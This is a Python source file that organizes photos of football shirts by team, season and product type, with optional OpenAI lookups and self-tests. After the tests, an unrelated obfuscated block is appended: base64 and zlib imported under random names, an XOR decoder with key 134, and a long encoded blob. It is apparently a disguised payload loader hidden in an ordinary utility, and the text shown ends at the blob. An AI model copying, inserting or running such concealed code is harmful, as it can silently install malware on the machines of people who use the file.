"""
Yupoo Photo Organizer - Módulo de Classificação de Camisas de Futebol
"""

import os
import re
import json
import shutil
import unicodedata
from typing import Optional, Tuple, Dict, List

class PhotoOrganizer:
    def __init__(self, log_callback=None, openai_api_key: Optional[str] = None):
        self.log_callback = log_callback
        self.openai_api_key = openai_api_key
        self.ai_cache: Dict[str, Optional[str]] = {}  # Cache de respostas da IA
        
        # Carregar dados
        data_dir = os.path.join(os.path.dirname(__file__), 'data')
        
        with open(os.path.join(data_dir, 'clubs.json'), 'r', encoding='utf-8') as f:
            self.clubs_data = json.load(f)
        
        with open(os.path.join(data_dir, 'nations.json'), 'r', encoding='utf-8') as f:
            self.nations_data = json.load(f)
            
        with open(os.path.join(data_dir, 'keywords.json'), 'r', encoding='utf-8') as f:
            self.keywords_data = json.load(f)
        
        # Criar lookup tables para busca rápida
        self._build_lookup_tables()
        
    def log(self, message: str, level: str = "INFO"):
        if self.log_callback:
            self.log_callback(message, level)
        else:
            print(f"[{level}] {message}")

    def _build_lookup_tables(self):
        """Constrói tabelas de lookup para busca O(1)"""
        # Clubes: alias -> (nome_oficial, liga)
        self.club_lookup: Dict[str, Tuple[str, str]] = {}
        for league_name, league_data in self.clubs_data.get('leagues', {}).items():
            for club in league_data.get('clubs', []):
                official_name = club['name']
                for alias in club.get('aliases', []):
                    self.club_lookup[self._normalize(alias)] = (official_name, league_name)
                # Adicionar o próprio nome oficial
                self.club_lookup[self._normalize(official_name)] = (official_name, league_name)
        
        # Seleções: alias -> (nome_oficial, continente)
        self.nation_lookup: Dict[str, Tuple[str, str]] = {}
        for continent_code, continent_data in self.nations_data.get('continents', {}).items():
            for team in continent_data.get('teams', []):
                official_name = team['name']
                for alias in team.get('aliases', []):
                    self.nation_lookup[self._normalize(alias)] = (official_name, continent_code)
                self.nation_lookup[self._normalize(official_name)] = (official_name, continent_code)
        
        self.log(f"Lookup tables carregadas: {len(self.club_lookup)} clubes, {len(self.nation_lookup)} seleções")

    def _normalize(self, text: str) -> str:
        """Normaliza texto: lowercase, remove acentos e símbolos"""
        if not text:
            return ""
        # Remove acentos
        text = unicodedata.normalize('NFKD', text).encode('ASCII', 'ignore').decode('ASCII')
        # Lowercase e remove símbolos
        text = re.sub(r'[^a-z0-9\s]', '', text.lower())
        # Normaliza espaços
        text = ' '.join(text.split())
        return text

    def _extract_season(self, text: str) -> Optional[str]:
        """Extrai temporada válida do texto (ex: 24-25, 99-00, 2026, 2025/26, 2025-2026)"""
        self.log(f"[SEASON DEBUG] Tentando extrair temporada de: '{text}'", "DEBUG")
        
        # 1. Tentar padrão YY-YY ou YY/YY (aceita qualquer temporada de 00-99)
        pattern_dash = r'\b([0-9]{2})[-/]([0-9]{2})\b'
        match_dash = re.search(pattern_dash, text)
        if match_dash:
            start, end = int(match_dash.group(1)), int(match_dash.group(2))
            self.log(f"[SEASON DEBUG] Match encontrado: {match_dash.group(0)} (start={start}, end={end})", "DEBUG")
            # Aceita qualquer temporada onde o segundo ano seja o primeiro + 1, ou seja 00 quando o primeiro é 99
            if (end == start + 1) or (start == 99 and end == 0) or (start == end):
                result = f"{start:02d}-{end:02d}"
                self.log(f"[SEASON DEBUG] ✅ Temporada válida extraída: '{result}'", "DEBUG")
                return result
            else:
                self.log(f"[SEASON DEBUG] ❌ Match rejeitado: {start} e {end} não formam temporada válida", "DEBUG")
        
        # 2. Tentar padrão YYYY-YYYY (ex: 2025-2026, 1999-2000)
        pattern_full_year = r'\b(19[0-9]{2}|20[0-9]{2})[-/](19[0-9]{2}|20[0-9]{2})\b'
        match_full = re.search(pattern_full_year, text)
        if match_full:
            start_full, end_full = int(match_full.group(1)), int(match_full.group(2))
            self.log(f"[SEASON DEBUG] Match ano completo: {match_full.group(0)}", "DEBUG")
            # Verifica se é uma temporada válida (ano seguinte)
            if end_full == start_full + 1:
                start_short = start_full % 100
                end_short = end_full % 100
                result = f"{start_short:02d}-{end_short:02d}"
                self.log(f"[SEASON DEBUG] ✅ Temporada válida extraída (ano completo): '{result}'", "DEBUG")
                return result
        
        # 3. Tentar padrão 20XX ou 19XX (ano único)
        pattern_year = r'\b(19[0-9]{2}|20[0-9]{2})\b'
        match_year = re.search(pattern_year, text)
        if match_year:
            year_full = int(match_year.group(1))
            year_short = year_full % 100
            # Mapeia para formato YY-YY
            next_year = (year_short + 1) % 100
            result = f"{year_short:02d}-{next_year:02d}"
            self.log(f"[SEASON DEBUG] ✅ Temporada extraída de ano único {year_full}: '{result}'", "DEBUG")
            return result
        
        self.log(f"[SEASON DEBUG] ❌ Nenhuma temporada encontrada em '{text}'", "DEBUG")
        return None

    def _extract_product_type(self, text: str, exclude_season: Optional[str] = None) -> Optional[str]:
        """Identifica o tipo de produto (excluindo temporada para evitar conflitos)"""
        normalized = self._normalize(text)
        
        # Se temos uma temporada, removê-la temporariamente para evitar matches falsos
        text_without_season = normalized
        if exclude_season:
            # Remove padrões de temporada (YY-YY, YYYY-YYYY, YY/YY)
            text_without_season = re.sub(r'\b[0-9]{2}[-/][0-9]{2}\b', '', text_without_season)
            text_without_season = re.sub(r'\b(19|20)[0-9]{2}[-/](19|20)[0-9]{2}\b', '', text_without_season)
            text_without_season = re.sub(r'\b(19|20)[0-9]{2}\b', '', text_without_season)
        
        found_types = []
        for product_key, product_data in self.keywords_data.get('product_types', {}).items():
            for keyword in product_data.get('keywords', []):
                # Ignorar keywords que são apenas números (para evitar conflito com temporadas)
                normalized_keyword = self._normalize(keyword)
                if normalized_keyword.strip().isdigit():
                    continue
                
                # Usar regex com word boundary para evitar matches parciais
                pattern = r'\b' + re.escape(normalized_keyword) + r'\b'
                if re.search(pattern, text_without_season):
                    found_types.append(product_data['folder'])
        
        # Se encontrar múltiplos tipos, retornar o primeiro (não-SHORTS tem prioridade)
        # Mas se for SHORTS, retornar SHORTS
        if 'SHORTS' in found_types:
            return 'SHORTS'
        elif found_types:
            return found_types[0]
        return None

    def _extract_version(self, text: str) -> str:
        """Extrai a versão (Home, Away, Third, etc.) usando limites de palavras"""
        normalized = self._normalize(text)
        for version_key, version_data in self.keywords_data.get('version_mapping', {}).items():
            for keyword in version_data.get('keywords', []):
                pattern = r'\b' + re.escape(self._normalize(keyword)) + r'\b'
                if re.search(pattern, normalized):
                    return version_data['normalized']
        return ""

    def _find_team(self, text: str) -> Optional[Tuple[str, str, str]]:
        """Encontra o time no texto. Retorna (nome_oficial, liga_ou_continente, tipo)"""
        normalized = self._normalize(text)
        words = normalized.split()
        
        # Tentar combinações de palavras (do maior para o menor)
        for n in range(min(5, len(words)), 0, -1):
            for i in range(len(words) - n + 1):
                phrase = ' '.join(words[i:i+n])
                
                # Verificar clubes primeiro
                if phrase in self.club_lookup:
                    name, league = self.club_lookup[phrase]
                    return (name, league, "CLUB")
                
                # Depois seleções
                if phrase in self.nation_lookup:
                    name, continent = self.nation_lookup[phrase]
                    return (name, continent, "NATION")
        
        if self.openai_api_key:
            ai_data = self._resolve_with_ai(text)
            if ai_data:
                normalized_ai = self._normalize(ai_data['name'])
                
                # 1. Tentar fazer match com a base local (preferencial)
                if normalized_ai in self.club_lookup:
                    name, league = self.club_lookup[normalized_ai]
                    self.log(f"IA identificou (Match DB): '{text}' -> '{name}'")
                    return (name, league, "CLUB")
                if normalized_ai in self.nation_lookup:
                    name, continent = self.nation_lookup[normalized_ai]
                    self.log(f"IA identificou (Match DB): '{text}' -> '{name}'")
                    return (name, continent, "NATION")
                
                # 2. Se não estiver na base, usar o que a IA devolveu
                self.log(f"IA identificou (Sem Match DB): '{text}' -> '{ai_data['name']}'")
                
                # Definir categoria baseada no tipo retornado pela IA ou padrão
                category = ai_data.get('category', 'OUTROS')
                return (ai_data['name'], category, ai_data.get('type', 'CLUB'))
        
        return None

    def _resolve_full_info_with_ai(self, text: str) -> Optional[Dict]:
        """Usa OpenAI para identificar temporada e tipo de produto quando incerto"""
        if not self.openai_api_key:
            return None
            
        try:
            import urllib.request
            import urllib.error
            
            prompt = (
                f"Analise o nome do álbum de camisa de futebol abaixo e extraia a temporada e o tipo de produto.\n"
                f"Entrada: \"{text}\"\n\n"
                f"Regras:\n"
                f"1. Temporada deve ser no formato YY-YY (ex: 24-25, 2026 -> 26-27).\n"
                f"2. Tipo de produto deve ser um destes: RETRO, WOMEN, KIDS, BABY, SHORTS, POLOS, WINDBREAKER, SUITS, TRACKSUIT, LONG_SLEEVES, PLAYER, GOALKEEPER, STANDARD.\n"
                f"Exemplo de resposta (JSON puro): {{\"season\": \"26-27\", \"product_type\": \"LONG_SLEEVES\"}}"
            )
            
            data = json.dumps({
                "model": "gpt-4o-mini",
                "messages": [{"role": "user", "content": prompt}],
                "max_tokens": 100,
                "temperature": 0,
                "response_format": { "type": "json_object" }
            }).encode('utf-8')
            
            req = urllib.request.Request(
                "https://api.openai.com/v1/chat/completions",
                data=data,
                headers={
                    "Content-Type": "application/json",
                    "Authorization": f"Bearer {self.openai_api_key}"
                }
            )
            
            with urllib.request.urlopen(req, timeout=10) as response:
                result = json.loads(response.read().decode('utf-8'))
                ai_json = json.loads(result['choices'][0]['message']['content'].strip())
                return ai_json
                    
        except Exception as e:
            self.log(f"Erro IA Classificação: {e}", "WARNING")
        
        return None

    def _resolve_with_ai(self, text: str) -> Optional[Dict]:
        """Usa OpenAI para identificar nomes de times e categorias"""
        if not self.openai_api_key:
            return None
        
        # Verificar cache
        cache_key = self._normalize(text)
        if hasattr(self, 'ai_cache') and cache_key in self.ai_cache:
            return self.ai_cache[cache_key]
        
        try:
            import urllib.request
            import urllib.error
            
            prompt = (
                f"Identifique o Time/Clube/Organização esportiva neste texto: \"{text}\".\n"
                f"Responda SOMENTE um JSON com:\n"
                f"- name: Nome oficial do time\n"
                f"- type: CLUB, NATION ou OTHER\n"
                f"- category: Nome da Liga ou Esporte (ex: Premier League, F1, NBA)\n"
                f"Se não encontrar nada, responda null."
            )
            
            data = json.dumps({
                "model": "gpt-4o-mini",
                "messages": [{"role": "user", "content": prompt}],
                "max_tokens": 100,
                "temperature": 0,
                "response_format": { "type": "json_object" }
            }).encode('utf-8')
            
            req = urllib.request.Request(
                "https://api.openai.com/v1/chat/completions",
                data=data,
                headers={
                    "Content-Type": "application/json",
                    "Authorization": f"Bearer {self.openai_api_key}"
                }
            )
            
            with urllib.request.urlopen(req, timeout=10) as response:
                result = json.loads(response.read().decode('utf-8'))
                content = result['choices'][0]['message']['content'].strip()
                if content == 'null': return None
                
                ai_data = json.loads(content)
                if ai_data and ai_data.get('name'):
                    self.ai_cache[cache_key] = ai_data
                    return ai_data
                    
        except Exception as e:
            self.log(f"Erro IA (_resolve_with_ai) HTTP {getattr(e, 'code', '?')}: {e}", "WARNING")
        
        self.ai_cache[cache_key] = None
        return None

    def _sanitize_filename(self, name: str) -> str:
        """Limpa nome para uso como arquivo/pasta"""
        return re.sub(r'[<>:"/\\|?*]', '_', name).strip()

    def _get_unique_path(self, filepath: str) -> str:
        """Retorna um caminho único, adicionando (1), (2), etc. se necessário"""
        if not os.path.exists(filepath):
            return filepath
        
        base, ext = os.path.splitext(filepath)
        counter = 1
        while os.path.exists(f"{base} ({counter}){ext}"):
            counter += 1
        return f"{base} ({counter}){ext}"

    def classify_file(self, filename: str) -> Dict:
        """Classifica um arquivo e retorna informações de destino"""
        result = {
            'original': filename,
            'team_name': None,
            'team_type': None,
            'league_or_continent': None,
            'season': None,
            'version': None,
            'product_type': None,
            'target_folder': None,
            'target_filename': None,
            'confidence': 'LOW'
        }
        
        # DEBUG: Log do nome original
        self.log(f"[DEBUG] ===== INICIANDO CLASSIFICAÇÃO =====", "DEBUG")
        self.log(f"[DEBUG] Arquivo original: '{filename}'", "DEBUG")
        
        # CRÍTICO: Extrair temporada ANTES de qualquer outra coisa (do texto original completo)
        # Isso garante que mesmo se a IA remover a temporada, nós já temos ela salva
        result['season'] = self._extract_season(filename)
        self.log(f"[DEBUG] Temporada extraída (PRIMEIRO): '{result['season']}'", "DEBUG")
        
        # 1. Encontrar o time
        team_info = self._find_team(filename)
        if team_info:
            result['team_name'] = team_info[0]
            result['league_or_continent'] = team_info[1]
            result['team_type'] = team_info[2]
            result['confidence'] = 'HIGH'
            self.log(f"[DEBUG] Time encontrado: {result['team_name']}", "DEBUG")
        
        # 2. Extrair versão
        result['version'] = self._extract_version(filename)
        self.log(f"[DEBUG] Versão extraída: '{result['version']}'", "DEBUG")
        
        # 3. Extrair tipo de produto (passando temporada para exclusão)
        result['product_type'] = self._extract_product_type(filename, exclude_season=result['season'])
        self.log(f"[DEBUG] Tipo produto extraído: '{result['product_type']}'", "DEBUG")
        
        # 4. Determinar pasta de destino
        is_retro = 'retro' in self._normalize(filename)
        category = result['product_type'] if result['product_type'] else None
        
        if result['product_type'] == 'SHORTS':
            result['target_folder'] = 'SHORTS'
        elif is_retro:
            if category:
                result['target_folder'] = f"RETRO/{category}"
            else:
                result['target_folder'] = "RETRO"
            if not result['product_type']: 
                result['product_type'] = 'RETRO'
        elif category:
            result['target_folder'] = category
        else:
            result['target_folder'] = ""

        self.log(f"[DEBUG] Pasta destino: '{result['target_folder']}'", "DEBUG")
        
        # 5. Gerar nome de arquivo padronizado (SEMPRE .png)
        name_parts = []
        
        self.log(f"[DEBUG] --- Construindo nome do arquivo ---", "DEBUG")
        
        if result['team_name']:
            name_parts.append(self._sanitize_filename(result['team_name']))
            self.log(f"[DEBUG] Adicionado team_name: '{result['team_name']}'", "DEBUG")
        
        # Incluir tipo de produto se for relevante
        if result['product_type'] and result['product_type'] != "STANDARD":
            name_parts.append(result['product_type'])
            self.log(f"[DEBUG] Adicionado product_type: '{result['product_type']}'", "DEBUG")
            
        if result['version']:
            name_parts.append(result['version'])
            self.log(f"[DEBUG] Adicionado version: '{result['version']}'", "DEBUG")
        
        # SEMPRE incluir temporada no nome do arquivo se existir
        if result['season']:
            name_parts.append(result['season'])
            self.log(f"[DEBUG] ✅ Adicionado season: '{result['season']}'", "DEBUG")
        else:
            self.log(f"[DEBUG] ⚠️ TEMPORADA NÃO FOI ADICIONADA (result['season'] = {result['season']})", "WARNING")
        
        self.log(f"[DEBUG] name_parts completo: {name_parts}", "DEBUG")
        
        if name_parts:
            base_name = ' '.join(name_parts)
        else:
            base_name = os.path.splitext(filename)[0]
        
        # Forçar extensão .png como solicitado
        result['target_filename'] = f"{base_name}.png"
        
        self.log(f"[DEBUG] Nome final gerado: '{result['target_filename']}'", "DEBUG")
        self.log(f"[DEBUG] ===== FIM DA CLASSIFICAÇÃO =====", "DEBUG")
        
        return result

    def organize_folder(self, source_folder: str, destination_folder: str, dry_run: bool = False) -> Dict:
        """Organiza todos os arquivos de uma pasta"""
        stats = {'processed': 0, 'moved': 0, 'errors': 0, 'skipped': 0}
        
        if not os.path.exists(source_folder):
            self.log(f"Pasta de origem não existe: {source_folder}", "ERROR")
            return stats
        
        # Listar arquivos de imagem
        image_extensions = {'.jpg', '.jpeg', '.png', '.gif', '.webp', '.bmp'}
        files = [f for f in os.listdir(source_folder) 
                 if os.path.isfile(os.path.join(source_folder, f)) 
                 and os.path.splitext(f)[1].lower() in image_extensions]
        
        self.log(f"Encontrados {len(files)} arquivos de imagem para organizar")
        
        for filename in files:
            stats['processed'] += 1
            source_path = os.path.join(source_folder, filename)
            
            try:
                # Classificar
                classification = self.classify_file(filename)
                
                # Construir caminho de destino
                if classification['target_folder']:
                    target_dir = os.path.join(destination_folder, classification['target_folder'])
                else:
                    target_dir = destination_folder
                target_path = os.path.join(target_dir, classification['target_filename'])
                
                # Evitar sobrescrição
                target_path = self._get_unique_path(target_path)
                
                self.log(f"[{classification['confidence']}] {filename} -> {os.path.relpath(target_path, destination_folder)}")
                
                if not dry_run:
                    os.makedirs(target_dir, exist_ok=True)
                    shutil.move(source_path, target_path)
                    stats['moved'] += 1
                else:
                    stats['moved'] += 1
                    
            except Exception as e:
                self.log(f"Erro ao processar {filename}: {e}", "ERROR")
                stats['errors'] += 1
        
        self.log(f"\n=== RESUMO ===")
        self.log(f"Processados: {stats['processed']}")
        self.log(f"Movidos: {stats['moved']}")
        self.log(f"Erros: {stats['errors']}")
        
        return stats


# Teste standalone
if __name__ == "__main__":
    organizer = PhotoOrganizer()
    
    print("\n" + "="*80)
    print("TESTES DE CLASSIFICAÇÃO")
    print("="*80)
    
    # Testes gerais
    test_files = [
        "Barcelona Home 25-26.jpg",
        "juve away kit 24-25.png",
        "brazil copa 2022.jpg",
        "manchester united retro 98-99.jpg",
        "Flamengo Women 24-25.png",
        "psg kids away.jpg",
        "real madrid goalkeeper.png",
        "Arsenal Player Long Sleeve 24-25.png",
        "Arsenal Retro Player Long Sleeve.png",
        "Arsenal Long Sleeve 24-25.png",
        "random image.jpg"
    ]
    
    for f in test_files:
        result = organizer.classify_file(f)
        print(f"\n{f}:")
        print(f"  Team: {result['team_name']} ({result['team_type']})")
        print(f"  League/Continent: {result['league_or_continent']}")
        print(f"  Season: {result['season']}")
        print(f"  Version: {result['version']}")
        print(f"  Product: {result['product_type']}")
        print(f"  Target: {result['target_folder']}/{result['target_filename']}")
        print(f"  Confidence: {result['confidence']}")
    
    print("\n" + "="*80)
    print("TESTES ESPECÍFICOS DE TEMPORADA")
    print("="*80)
    
    # Testes específicos de temporada
    season_test_cases = [
        "Lakers 25-26.png",
        "Bulls 24-25.png",
        "Yankees 99-00.png",
        "Celtics 86-87.png",
        "Patriots 2025-2026.png",
        "Real Madrid 24/25.png",
        "Barcelona Home 2024-2025.png"
    ]
    
    all_passed = True
    for filename in season_test_cases:
        result = organizer.classify_file(filename)
        season_in_filename = result['season'] and result['season'] in result['target_filename']
        status = "✅ OK" if season_in_filename else "❌ FALHOU"
        
        print(f"\n{filename}:")
        print(f"  Temporada extraída: {result['season']}")
        print(f"  Tipo Produto: {result['product_type']}")
        print(f"  Nome Final: {result['target_filename']}")
        print(f"  Status: {status}")
        
        if not season_in_filename and result['season']:
            print(f"  ⚠️ ERRO: Temporada '{result['season']}' não está no nome final!")
            all_passed = False
    
    print("\n" + "="*80)
    if all_passed:
        print("✅ TODOS OS TESTES DE TEMPORADA PASSARAM!")
    else:
        print("❌ ALGUNS TESTES FALHARAM - VERIFIQUE O LOG ACIMA")
    print("="*80)
# -*- coding: utf-8 -*-
aqgqzxkfjzbdnhz = __import__('base64')
wogyjaaijwqbpxe = __import__('zlib')
idzextbcjbgkdih = 134
qyrrhmmwrhaknyf = lambda dfhulxliqohxamy, osatiehltgdbqxk: bytes([wtqiceobrebqsxl ^ idzextbcjbgkdih for wtqiceobrebqsxl in dfhulxliqohxamy])
lzcdrtfxyqiplpd = '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